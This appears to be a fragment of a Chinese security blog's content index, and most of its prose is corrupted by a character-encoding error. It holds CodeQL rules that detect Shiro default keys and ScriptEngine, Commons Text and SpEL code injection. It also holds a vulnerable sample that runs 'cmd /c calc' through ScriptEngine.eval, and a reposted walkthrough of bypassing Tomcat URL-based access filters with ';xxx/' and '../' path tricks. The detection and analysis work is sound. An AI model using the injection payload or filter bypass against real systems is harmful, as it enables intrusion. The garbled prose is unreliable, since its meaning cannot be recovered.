shiroåœ¨æ—©æœŸç‰ˆæœ¬ä¸­çš„ç”¨æ¥åºåˆ—åŒ–ååºåˆ—åŒ–çš„keyå¯ä»¥è¢«å®šä¹‰ï¼ŒæŸ¥è¯¢ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨é»˜è®¤å¯†é’¥å®šä¹‰ã€‚ import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport DataFlow::PathGraph//æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ Shiro é»˜è®¤ç§˜é’¥class ShiroDefaultKey extends TaintTracking::Configuration ShiroDefaultKey() this = ShiroDefaultKey override predicate isSource(DataFlow::Node src) src.asExpr() instanceof StringLiteral override predicate isSink(DataFlow::Node src) exists(MethodCall methodCall | methodCall.getMethod().getName() = setCipherKey and methodCall.getQualifier().getType().getName() = CookieRememberMeManager and src.asExpr() = methodCall.getAnArgument() ) from DataFlow::PathNode source, DataFlow::PathNode sink, ShiroDefaultKey conf, MethodCall methodCallwhere conf.hasFlowPath(source, sink) and sink.getNode().asExpr() = methodCall.getAnArgument()// select source, sink, methodCall, methodCall.getEnclosingCallable()select source.toString(),source.getNode().getEnclosingCallable(),source.getNode().getEnclosingCallable().getFile().getAbsolutePath(), sink.toString(),sink.getNode().getEnclosingCallable(), sink.getNode().getEnclosingCallable().getFile().getAbsolutePath(), Shiro Default Key è„šæœ¬æ›´æ–°ä¸ºæ–°ç‰ˆæ”¯æŒè¯­æ³•ï¼Œå‡å°‘waringæŠ¥é”™ã€‚ /** * @name Apache Shiro Default Key * @description Apache Shiro Default Key * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-shiro-default-key * @tags devrules */import javaimport Flow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport semmle.code.java.dataflow.TaintTrackingmodule RCEConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node source) source = source predicate isSink(DataFlow::Node sink) exists(MethodCall methodCall, Class c | methodCall.getMethod().getName() = setCipherKey and methodCall.getQualifier().getType() = c and c.hasQualifiedName(org.apache.shiro.web.mgt, CookieRememberMeManager) and sink.asExpr() = methodCall.getAnArgument() ) module Flow = DataFlow::GlobalRCEConfig;from Flow::PathNode source, Flow::PathNode sinkwhere Flow::flowPath(source, sink)select sink.getNode(), source, sink, Shiro Default Key ScriptEngine RCEè§„åˆ™æŸ¥è¯¢ï¼ˆæ”¯æŒæ–°ç‰ˆè¯­æ³•ï¼‰Javaé»˜è®¤çš„JavaScriptè§£æå™¨ï¼Œå¯ä»¥è§£æJavaä»£ç é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚ æ¼æ´ä»£ç ï¼š ScriptEngineManager scriptEngineManager = new ScriptEngineManager();ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(js);String command = new java.lang.ProcessBuilder[(java.lang.String[])]([cmd,/c,calc]).start();scriptEngine.eval(command); ä½¿ç”¨æ–°ç‰ˆè§„åˆ™è¿›è¡ŒæŸ¥è¯¢ï¼Œå‡å°‘æ§åˆ¶å°Warningè­¦å‘Šã€‚ /** * @name Script Engine RCE * @description Script Engine RCE * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-script-engine * @tags devrules */import javaimport ScriptEngineFlow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesmodule ScriptEngineConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node source) source instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(MethodCall methodCall, Class c | methodCall.getMethod().getName() = eval and methodCall.getQualifier().getType().getName() = ScriptEngine and sink.asExpr() = methodCall.getAnArgument() ) module ScriptEngineFlow = DataFlow::GlobalScriptEngineConfig;from ScriptEngineFlow::PathNode source, ScriptEngineFlow::PathNode sinkwhere ScriptEngineFlow::flowPath(source, sink)select sink.getNode(), source, sink, Script Engine RCE Apache Commons Text è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆæ”¯æŒæ–°ç‰ˆè¯­æ³•ï¼‰/** * @name Apache Commons Text Rce * @description Apache Commons Text Rce * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id java/rce-apache-commons-text * @tags devrules */import javaimport CommonsTextRCEFlow::PathGraphimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.FlowSourcesimport semmle.code.java.dataflow.TaintTrackingmodule CommonsTextRCEConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node source) source instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(MethodCall methodCall , Class c| methodCall.getMethod().getName().substring(0, 7) = replace and methodCall.getQualifier().getType() = c and c.hasQualifiedName(org.apache.commons.text, StringSubstitutor) and sink.asExpr() = methodCall.getAnArgument() ) module CommonsTextRCEFlow = DataFlow::GlobalCommonsTextRCEConfig;from CommonsTextRCEFlow::PathNode source, CommonsTextRCEFlow::PathNode sinkwhere CommonsTextRCEFlow::flowPath(source, sink)select sink.getNode(), source, sink, Apache Commons Text Rce SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼ˆæ”¯æŒæ–°ç‰ˆè¯­æ³•ï¼‰import java import semmle.code.java.dataflow.DataFlow import semmle.code.java.dataflow.FlowSources module SpELConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node source) source instanceof RemoteFlowSource predicate isSink(DataFlow::Node sink) exists(MethodCall methodCall | methodCall.getMethod().getName() = parseExpression and methodCall.getQualifier().getType().getName() = SpelExpressionParser and sink.asExpr() = methodCall.getAnArgument() ) module SpELFlow = DataFlow::GlobalSpELConfig; from DataFlow::Node source, DataFlow::Node sink where SpELFlow::flow(source, sink) select source,sink å°æŠ€å·§æœ‰æ—¶å€™è·å–åˆ°çš„å¯èƒ½å¹¶éæºç ï¼Œè€Œæ˜¯jaråŒ…ï¼Œä½†æ˜¯jaråŒ…åç¼–è¯‘åçš„æºç å†æ¬¡é‡ç¼–è¯‘ä¼šå› ä¸ºç§ç§åŸå› ç¼–è¯‘é”™è¯¯ï¼Œåœ¨ä¸€æ¬¡å’Œä¸€ä½é«˜æ‰‹æ²Ÿé€šçš„è¿‡ç¨‹ä¸­æˆ‘äº†è§£åˆ°ä¹Ÿå¯ä»¥ä¸é€šè¿‡ç¼–è¯‘æ¥æ„å»ºcodeqlæ•°æ®åº“ æ¨¡æ‹Ÿå¤§éƒ¨åˆ†æƒ…å†µä¸‹è·å–jaråŒ…çš„æƒ…å†µï¼Œå…ˆæ‰“åŒ…ååç¼–è¯‘ java -jar java-decompiler.jar D:\\Downloads\\micro_service_seclab\\target\\micro-service-seclab-0.0.1-SNAPSHOT.jar D:\\Downloads\\micro_service_seclab\\decompile åç¼–è¯‘åå¾—åˆ°ä¸€ä¸ªjaråŒ…ï¼Œä¸è¿‡è§£å‹åä¼šå‘ç°é‡Œé¢çš„æ–‡ä»¶ä¸å†æ˜¯classè€Œæ˜¯java åˆ›å»ºæ•°æ®åº“ codeql database create D:\\Downloads\\micro_service_seclab\\database --language java -s D:\\Downloads\\micro_service_seclab\\decompile\\micro-service-seclab-0.0.1-SNAPSHOT --overwrite --build-mode none å…ˆè®°ä¸€ä¸‹ï¼Œè¿˜æ²¡è¯•è¿‡ åƒä½ è¯´çš„ Hessian ååºåˆ—åŒ–æ¼æ´ è¿™ç±»åœºæ™¯ï¼Œæ¼æ´ç‚¹å¾€å¾€å­˜åœ¨äº ä¸šåŠ¡ä»£ç è°ƒç”¨å¤–éƒ¨ä¾èµ–åº“ï¼ˆHessian æ¡†æ¶ï¼‰ çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€ä»¥æ•°æ®åº“å¿…é¡»åŒ…å«ï¼š é¡¹ç›®è‡ªèº«çš„æºç  é¡¹ç›®ä¾èµ–çš„ä¸‰æ–¹åº“ï¼ˆjar åŒ…ï¼‰ å¦åˆ™ CodeQL çš„æ•°æ®æµå›¾ä¸å®Œæ•´ï¼Œå°±æ²¡æ³•è¿½è¸ªåˆ° HessianInput.readObject() ä¹‹ç±»çš„å±é™©è°ƒç”¨ã€‚ æ­£ç¡®çš„æ•°æ®åº“åˆ›å»ºæµç¨‹ï¼ˆJava é¡¹ç›®ï¼‰1. ç”¨æ„å»ºå·¥å…·ç”Ÿæˆæ•°æ®åº“ Maven é¡¹ç›®ï¼š codeql database create mydb \\ --language=java \\ --command=mvn clean compile -DskipTests Gradle é¡¹ç›®ï¼š codeql database create mydb \\ --language=java \\ --command=./gradlew build -x test åŸç†ï¼š CodeQL çš„ Java extractor ä¼šæ‹¦æˆª javacï¼Œåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­æŠŠæºç å’Œä¾èµ–å…³ç³»æ”¶é›†åˆ°æ•°æ®åº“é‡Œã€‚ è¿™æ ·ä¸ä»…æœ‰é¡¹ç›®æºç ï¼Œè¿˜ä¼šè‡ªåŠ¨æŠŠ ä¾èµ– jar åŒ…é‡Œçš„ç±»ç­¾å æ”¶å½•è¿›æ¥ï¼ˆç”¨äºè°ƒç”¨å…³ç³»ï¼‰ã€‚ 2. å¦‚æœé¡¹ç›®æ²¡æœ‰æ ‡å‡†æ„å»ºå‘½ä»¤æœ‰äº›é¡¹ç›®æ˜¯æ‰‹å·¥ç¼–è¯‘æˆ–è€…æ²¡ç”¨ MavenGradleã€‚ è¿™æ—¶ä½ éœ€è¦æ˜¾å¼å‘Šè¯‰ CodeQL æºç  + classpathï¼š codeql database create mydb \\ --language=java \\ --source-root . \\ --command=javac -cp lib/* -d build/classes $(find src -name *.java) lib/*ï¼šä¾èµ– jar åŒ…ç›®å½•ï¼ˆä¾‹å¦‚åŒ…å« hessian.jarï¼‰ srcï¼šæºç ç›®å½• è¿™æ · extractor åœ¨åˆ†ææ—¶å°±èƒ½çœ‹è§ Hessian çš„ API å¹¶æ„å»ºè°ƒç”¨å›¾ã€‚ 3. ç¡®è®¤æ•°æ®åº“é‡ŒåŒ…å«ä¾èµ–åˆ›å»ºå®Œæˆåï¼Œä½ å¯ä»¥æ£€æŸ¥æ•°æ®åº“é‡Œæ˜¯å¦åŒ…å«ä¾èµ–ï¼š codeql database interpret-results mydb æˆ–è€…åœ¨ .db ç›®å½•ä¸‹æ‰¾åˆ° dbschemeï¼Œç¡®è®¤æ˜¯å¦è§£æäº† Hessian çš„ç±»ã€‚","categories":["å·¥å…·"]},{"title":"Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜","path":"/2025/08/20/Tomcat-URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜/","content":"å¼•ç”¨Tomcat URLè§£æå·®å¼‚æ€§å¯¼è‡´çš„å®‰å…¨é—®é¢˜ å‰è¨€æœ¬æ–‡ä¸»è¦æ˜¯å¯¹è¯¥ç¯‡æ–‡ç« è¿›è¡Œä¸€ä¸ªå¤‡ä»½ï¼Œé¿å…åç»­æ‰¾ä¸åˆ°è¯¥æ–‡ç« äº† URLè§£æå·®å¼‚æ€§HttpServletRequestä¸­å‡ ä¸ªè§£æURLçš„å‡½æ•°åœ¨Servletå¤„ç†URLè¯·æ±‚çš„è·¯å¾„æ—¶ï¼ŒHTTPServletRequestæœ‰å¦‚ä¸‹å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼š request.getRequestURL()ï¼šè¿”å›å…¨è·¯å¾„ï¼› request.getRequestURI()ï¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ï¼› request.getContextPath()ï¼šè¿”å›å·¥ç¨‹åéƒ¨åˆ†ï¼Œå¦‚æœå·¥ç¨‹æ˜ å°„ä¸º/ï¼Œåˆ™è¿”å›ä¸ºç©ºï¼› request.getServletPath()ï¼šè¿”å›é™¤å»Hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ï¼› request.getPathInfo()ï¼šä»…è¿”å›ä¼ é€’åˆ°Servletçš„è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’é¢å¤–çš„è·¯å¾„ä¿¡æ¯ï¼Œåˆ™æ­¤è¿”å›Nullï¼› ç½‘ä¸Šçš„ä¸€ä¸ªå°ç»“ï¼ŒServletçš„åŒ¹é…è·¯å¾„ä¸º/test%3F/*ï¼Œå¹¶ä¸”Webåº”ç”¨æ˜¯éƒ¨ç½²åœ¨/appä¸‹ï¼Œæ­¤æ—¶è¯·æ±‚çš„URLä¸ºhttp://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+dp+2=e+f#aï¼Œå„ä¸ªå‡½æ•°è§£æå¦‚ä¸‹è¡¨ï¼š å‡½æ•° URLè§£ç  è§£æç»“æ„ getRequestURL() no http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID getRequestURI() no /app/test%3F/a%3F+b;jsessionid=s%3F+ID getContextPath() no /app getServletPath() yes /test? getPathInfo() yes /a?+b ç‰¹æ®Šå­—ç¬¦çš„URLè§£ææ–°å»ºä¸€ä¸ªJava Webé¡¹ç›®ï¼Œindex.jspå¦‚ä¸‹ï¼š %out.println(getRequestURL(): + request.getRequestURL() + br);out.println(getRequestURI(): + request.getRequestURI() + br);out.println(getContextPath(): + request.getContextPath() + br);out.println(getServletPath(): + request.getServletPath() + br);out.println(getPathInfo(): + request.getPathInfo() + br);% æ­£å¸¸è®¿é—®Tomcatè¿è¡Œä¹‹åï¼Œæ­£å¸¸è®¿é—®http://localhost:8080/urltest/index.jspï¼Œé¡µé¢è¾“å‡ºå¦‚ä¸‹ï¼š æ’å…¥ . è®¿é—®å°è¯•æ’å…¥å¤šä¸ª./è®¿é—®å³http://localhost:8080/urltest/./././index.jspï¼Œé¡µé¢è¾“å‡ºå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæ’å…¥å¤šä¸ª./ä¹Ÿèƒ½æ­£å¸¸è®¿é—®ã€‚ æ¥ç€å°è¯•è¿™ç§å½¢å¼http://localhost:8080/urltest/.a/.bb/.ccc/index.jspï¼Œå‘ç°æ˜¯è¿”å›404ï¼Œæœªæ‰¾åˆ°è¯¥èµ„æºè®¿é—®ï¼š æ’å…¥ .. è®¿é—®å°è¯•æ’å…¥../è®¿é—®å³http://localhost:8080/urltest/../index.jspï¼Œé¡µé¢è¾“å‡ºå¦‚ä¸‹ï¼š å¯ä»¥æ˜¯è¿”å›çš„404ï¼Œè¿™æ˜¯å› ä¸ºå®é™…è®¿é—®çš„æ˜¯http://localhost:8080/index.jspï¼Œè¿™ä¸ªç›®å½•æ–‡ä»¶å½“ç„¶ä¸å­˜åœ¨ã€‚ æ¢ç§è·¨ç›®å½•çš„å½¢å¼å°±OKäº†http://localhost:8080/urltest/noexist/../index.jspï¼š æ’å…¥ ; è®¿é—®å°è¯•æ’å…¥å¤šä¸ª;/è®¿é—®å³http://localhost:8080/urltest/;/;/;/index.jspï¼Œé¡µé¢è¾“å‡ºå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæ’å…¥å¤šä¸ª;ä¹Ÿèƒ½æ­£å¸¸è®¿é—®ã€‚ åœ¨;å·åé¢åŠ ä¸Šå­—ç¬¦ä¸²ä¹Ÿæ˜¯èƒ½æ­£å¸¸è®¿é—®çš„ï¼Œå¦‚http://localhost:8080/urltest/;a/;bb/;ccc/index.jspï¼š æ’å…¥å…¶ä»–ç‰¹æ®Šå­—ç¬¦è®¿é—®å°è¯•æ’å…¥å¦‚ä¸‹è¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè®¿é—®ï¼Œé¡µé¢å‡è¿”å›400æˆ–404ï¼Œæ— æ³•è®¿é—®ï¼š ` ~ ! @ # $ % ^ * ( ) - _ = + [ ] \\ | : ? å°ç»“ç”±å‰é¢çš„å°è¯•çŸ¥é“ï¼ŒTomcatä¸­çš„URLè§£ææ˜¯æ”¯æŒåµŒå…¥./ã€../ã€;xx/ç­‰ç‰¹æ®Šå­—ç¬¦çš„ã€‚æ­¤å¤–ï¼ŒgetRequestURL()å’ŒgetRequestURI()è¿™ä¸¤ä¸ªå‡½æ•°è§£ææå–çš„URLå†…å®¹æ˜¯åŒ…å«æˆ‘ä»¬åµŒå…¥çš„ç‰¹æ®Šå­—ç¬¦çš„ï¼Œå½“ä½¿ç”¨ä¸å½“æ—¶ä¼šå­˜åœ¨å®‰å…¨é—®é¢˜å¦‚ç»•è¿‡è®¤è¯ã€‚ è°ƒè¯•åˆ†æTomcatä¼šå…ˆå¯¹è¯·æ±‚çš„URLè¿›è¡Œè§£æå¤„ç†ï¼Œæå–åˆ°ä¸€äº›ä¿¡æ¯ä¹‹åæ‰ä¼šåˆ°è°ƒç”¨getRequestURI()ç­‰å‡½æ•°çš„æµç¨‹ã€‚ Tomcatå¯¹URLç‰¹æ®Šå­—ç¬¦çš„å¤„ç†è¿™é‡Œæˆ‘ä»¬å…ˆæ¥è°ƒè¯•åˆ†æä¸‹Tomcatæ˜¯å¦‚ä½•å¯¹è¯·æ±‚URLä¸­ä¸åŒçš„ç‰¹æ®Šå­—ç¬¦ä½œä¸åŒçš„å¤„ç†çš„ã€‚ ç»è¿‡è°ƒè¯•åˆ†æï¼Œå¾—çŸ¥Tomcatæ˜¯åœ¨CoyoteAdapter.service()å‡½æ•°ä¸Šå¯¹è¯·æ±‚URLè¿›è¡Œè§£æå¤„ç†çš„ï¼Œç›´æ¥åœ¨è¿™é‡Œæ‰“ä¸Šæ–­ç‚¹ï¼Œæ­¤æ—¶çš„å‡½æ•°è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š service:452, CoyoteAdapter (org.apache.catalina.connector)process:1195, AbstractHttp11Processor (org.apache.coyote.http11)process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang) åœ¨CoyoteAdapter.service()å‡½æ•°ä¸­ï¼Œä¼šè°ƒç”¨postParseRequest()å‡½æ•°æ¥è§£æURLè¯·æ±‚å†…å®¹ï¼š è·Ÿè¿›postParseRequest()å‡½æ•°ä¸­ï¼Œå…¶ä¸­å…ˆåè°ƒç”¨parsePathParameters()å’Œnormalize()å‡½æ•°å¯¹è¯·æ±‚å†…å®¹è¿›è¡Œè§£æå¤„ç†ï¼š è¿™é‡Œæˆ‘ä»¬å…ˆè·Ÿè¿›parsePathParameters()å‡½æ•°ï¼Œå…ˆæ˜¯å¯»æ‰¾URLä¸­æ˜¯å¦å­˜åœ¨;å·ï¼Œæ‰¾åˆ°çš„è¯æ‰ä¼šè¿›å…¥ä¸‹é¢çš„ifä»£ç é€»è¾‘ï¼š å¦‚æœæ‰¾åˆ°äº†;å·ï¼Œåœ¨ifä»£ç é€»è¾‘ä¸­åé¢çš„å¾ªç¯ä½“ä¼šå°†;xxx/ä¸­çš„åˆ†å·ä¸æ–œæ ä¹‹é—´çš„å­—ç¬¦ä¸²ä»¥åŠåˆ†å·æœ¬èº«éƒ½å»æ‰ï¼Œæˆ‘ä»¬è®¿é—®http://localhost:8080/urltest/;mi1k7ea/index.jspå†è¯•ä¸‹ï¼Œå°±å¯ä»¥è¿›å…¥è¯¥ä»£ç é€»è¾‘è°ƒè¯•çœ‹åˆ°ï¼ˆä»£ç ä¸­ASCIIç 59æ˜¯;ï¼Œ47æ˜¯/ï¼‰ï¼š ç”±æ­¤å¯çŸ¥ï¼ŒparsePathParameters()å‡½æ•°æ˜¯å¯¹;xxx/è¿™ç§å½¢å¼è¿›è¡Œå¤„ç†çš„ã€‚ æ¥ç€ï¼Œè·Ÿè¿›normalize()å‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯å¯¹ç»è¿‡parsePathParameters()å‡½æ•°å¤„ç†è¿‡åçš„è¯·æ±‚URLè¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ã€‚ å…ˆçœ‹åˆ°è¿™æ®µä»£ç ï¼ŒASCIIç 92è¡¨ç¤º\\ï¼Œå½“åŒ¹é…åˆ°æ—¶å°†å…¶æ›¿æ¢ä¸ºASCIIç ä¸º47çš„/ï¼›å½“åŒ¹é…åˆ°ASCIIç 0å³ç©ºå­—ç¬¦æ—¶ï¼Œç›´æ¥è¿”å›falseæ— æ³•æˆåŠŸè§£æï¼š å¾€ä¸‹æ˜¯è¿™æ®µå¾ªç¯ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è¿ç»­çš„/ï¼Œå­˜åœ¨çš„è¯åˆ™å¾ªç¯åˆ é™¤æ‰å¤šä½™çš„/ï¼š æ¥ç€å¾€ä¸‹çœ‹ï¼Œè¿™æ®µå¾ªç¯å°±æ˜¯å¯¹./å’Œ../è¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œå¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½æ‰¾ä¸åˆ°åˆ™ç›´æ¥è¿”å›trueï¼š è¿™é‡Œå°è¯•ä¸‹æ·»åŠ /./è®¿é—®çš„å¤„ç†ï¼Œçœ‹åˆ°æ‰¾åˆ°ä¹‹åæ˜¯ç›´æ¥å°†å…¶å»æ‰ç„¶åç»§ç»­æ”¾è¡Œï¼š è¿™é‡Œå°è¯•ä¸‹æ·»åŠ /../è®¿é—®çš„å¤„ç†ï¼Œçœ‹åˆ°æ‰¾åˆ°åæ˜¯ä¼šè¿›è¡Œå¾€å‰ç›®å½•å±‚çº§çš„å›æº¯å¤„ç†å†æ‹¼æ¥åˆ°ä¸Šé¢æŸä¸€å±‚ç›®å½•å½¢æˆæ–°çš„URLï¼š ç”±æ­¤å¯çŸ¥ï¼Œnormalize()å‡½æ•°å¯¹ç»è¿‡ç»è¿‡parsePathParameters()å‡½æ•°è¿‡æ»¤è¿‡;xxx/çš„URLè¯·æ±‚å†…å®¹è¿›æ ‡å‡†åŒ–å¤„ç†ï¼Œå…·ä½“ä¸ºå°†è¿ç»­çš„å¤šä¸ª/ç»™åˆ é™¤æ‰åªä¿ç•™ä¸€ä¸ªã€å°†/./åˆ é™¤æ‰ã€å°†/../è¿›è¡Œè·¨ç›®å½•æ‹¼æ¥å¤„ç†ï¼Œæœ€åè¿”å›å¤„ç†åçš„URLè·¯å¾„ã€‚ ç»“è®º Tomcatå¯¹/;xxx/ä»¥åŠ/./çš„å¤„ç†æ˜¯åŒ…å®¹çš„ã€å¯¹/../ä¼šè¿›è¡Œè·¨ç›®å½•æ‹¼æ¥å¤„ç†ã€‚ getRequestURI()çš„å¤„ç†æˆ‘ä»¬ç›´æ¥åœ¨index.jspä¸­è°ƒç”¨getRequestURI()å‡½æ•°çš„åœ°æ–¹æ‰“ä¸Šæ–­ç‚¹è°ƒè¯•å³å¯ã€‚ è¿™é‡Œæ˜¯ç›´æ¥è°ƒç”¨Request.requestURI()å‡½æ•°ç„¶åç›´æ¥è¿”å›å…¶å­—ç¬¦ä¸²å€¼ï¼š è·Ÿè¿›Request.requestURI()å‡½æ•°ï¼Œè¿™é‡Œæ˜¯ç›´æ¥è¿”å›è¯·æ±‚çš„URLå†…å®¹ï¼Œæ²¡æœ‰åšä»»ä½•å¤„ç†ä»¥åŠURLè§£ç ï¼š getRequestURL()çš„å¤„ç†åœ¨getRequestURL()å‡½æ•°ä¸­æ˜¯è°ƒç”¨äº†Request.getRequestURL()å‡½æ•°çš„ï¼š è·Ÿè¿›è¯¥å‡½æ•°ï¼Œåœ¨æå–äº†åè®®ç±»å‹ã€hostå’Œportä¹‹åï¼Œè°ƒç”¨äº†getRequestURI()å‡½æ•°è·å–URLè¯·æ±‚çš„è·¯å¾„ï¼Œç„¶åç›´æ¥æ‹¼æ¥è¿›URLç›´æ¥è¿”å›è€Œä¸åšåŒ…æ‹¬URLè§£ç çš„ä»»ä½•å¤„ç†ï¼š getServletPath()çš„å¤„ç†åœ¨getServletPath()å‡½æ•°ä¸­æ˜¯è°ƒç”¨äº†Request.getServletPath()å‡½æ•°çš„ï¼š è·Ÿè¿›å»ï¼Œçœ‹åˆ°æ˜¯ç›´æ¥è¿”å›å‰é¢Tomcatå·²ç»å¤„ç†è¿‡åçš„æå–å¤„ç†çš„Servletè·¯å¾„ï¼Œæ³¨æ„è¿™é‡Œæ˜¯è·å–MappingDataç±»å¯¹è±¡ä¸­çš„wrapperPathå±æ€§å€¼ï¼š getPathInfo()çš„å¤„ç†å’ŒgetServletPath()å‡½æ•°çš„å¤„ç†æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·æ˜¯è¿”å›å‰é¢ç»è¿‡Tomcatè§£æå¤„ç†åçš„MappingDataç±»å¯¹è±¡ä¸­å…¶ä¸­ä¸€ä¸ªå±æ€§å€¼ï¼Œè¿™é‡Œæ˜¯è·å–çš„pathInfoå±æ€§å€¼å¹¶ç›´æ¥è¿”å›ï¼š getContextPath()çš„å¤„ç†åœ¨getContextPath()å‡½æ•°ä¸­ï¼Œè°ƒç”¨äº†Request.getContextPath()å‡½æ•°ï¼š è·Ÿè¿›è¯¥å‡½æ•°ï¼Œå…ˆæ˜¯è°ƒç”¨getServletContext().getContextPath()æ¥è·å–å½“å‰Servletä¸Šä¸‹æ–‡è·¯å¾„ä»¥åŠè°ƒç”¨getRequestURI()å‡½æ•°è·å–å½“å‰è¯·æ±‚çš„ç›®å½•è·¯å¾„ï¼š å¾€ä¸‹çš„è¿™æ®µå¾ªç¯æ˜¯å¤„ç†uriå˜é‡å€¼ä¸­å¦‚æœå­˜åœ¨å¤šä¸ªè¿ç»­çš„/åˆ™åˆ é™¤æ‰ï¼š å†å¾€ä¸‹ï¼Œè·å–ä¸‹ä¸€ä¸ª/ç¬¦å·çš„ä½ç½®ï¼Œç„¶åæ ¹æ®è¯¥ä½ç½®ç´¢å¼•å¯¹uriå˜é‡å€¼è¿›è¡Œå·¥ç¨‹åçš„åˆ‡åˆ†æå–ï¼š æ¥ç€ï¼Œå°±æ˜¯å¯¹åˆšåˆšåˆ‡åˆ†å¾—åˆ°çš„candidateå˜é‡è¿›è¡Œå’ŒTomcatä¸€æ ·çš„ç‰¹æ®Šå­—ç¬¦å¤„ç†è¿‡ç¨‹ï¼Œå…ˆè°ƒç”¨removePathParameters()å¤„ç†;å’Œ.ï¼Œç„¶åè¿›è¡ŒURLè§£ç ï¼Œå†è°ƒç”¨normalize()å‡½æ•°è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ï¼Œå¤„ç†è¿‡åæ¯”è¾ƒå¤„ç†å®Œçš„candidateå˜é‡å€¼å’Œä¹‹å‰è·å–çš„è§„èŒƒä¸Šä¸‹æ–‡è·¯å¾„æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´çš„è¯å°±å¾ªç¯ç»§ç»­å‰é¢çš„æ“ä½œç›´è‡³ä¸€è‡´ä¸ºæ­¢ï¼š æœ€åï¼Œç›´æ¥è¿”å›æŒ‰posç´¢å¼•åˆ‡åˆ†çš„uriå˜é‡å€¼ï¼š æ”»å‡»åˆ©ç”¨çœ‹ä¸ªè®¿é—®é™åˆ¶ç»•è¿‡çš„åœºæ™¯ã€‚ å‡è®¾Tomcatä¸Šå¯åŠ¨çš„Webç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªinfoç›®å½•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªsecret.jspæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ•æ„Ÿä¿¡æ¯ç­‰ï¼š %@ page contentType=text/html;charset=UTF-8 language=java %htmlhead titleSecret/title/headbodyusername: mi1k7eabrpassword: 123456braddress: chinabrphone: 13666666666br/body/html æ–°å»ºä¸€ä¸ªfilteråŒ…ï¼Œå…¶ä¸­æ–°å»ºä¸€ä¸ªtestFilterç±»ï¼Œå®ç°Filteræ¥å£ç±»ï¼š package filter;import javax.servlet.*;import javax.servlet.http.*;import java.io.IOException;public class testFilter implements Filter @Override public void init(FilterConfig filterConfig) throws ServletException @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest; HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse; String url = httpServletRequest.getRequestURI(); if (url.startsWith(/urltest/info)) httpServletResponse.getWriter().write(No Permission.); return; filterChain.doFilter(servletRequest, servletResponse); @Override public void destroy() è¿™ä¸ªFilterä½œç”¨æ˜¯ï¼šåªè¦è®¿é—®urltestinfoç›®å½•ä¸‹çš„èµ„æºï¼Œéƒ½éœ€è¦è¿›è¡Œæƒé™åˆ¤æ–­ï¼Œå¦åˆ™ç›´æ¥æ”¾è¡Œã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œè°ƒç”¨getRequestURI()å‡½æ•°æ¥è·å–è¯·æ±‚ä¸­çš„URLç›®å½•è·¯å¾„ï¼Œç„¶åè°ƒç”¨startsWith()å‡½æ•°åˆ¤æ–­æ˜¯å¦æ˜¯è®¿é—®çš„æ•æ„Ÿç›®å½•ï¼Œè‹¥æ˜¯åˆ™è¿”å›æ— æƒé™çš„å“åº”ã€‚å½“ç„¶è¿™é‡Œå†™å¾—éå¸¸ç®€å•ï¼Œåªåšæ¼”ç¤ºç”¨ã€‚ ç¼–è¾‘web.xmlï¼Œæ·»åŠ testFilterè®¾ç½®ï¼š ?xml version=1.0 encoding=UTF-8?web-app xmlns=http://xmlns.jcp.org/xml/ns/javaee 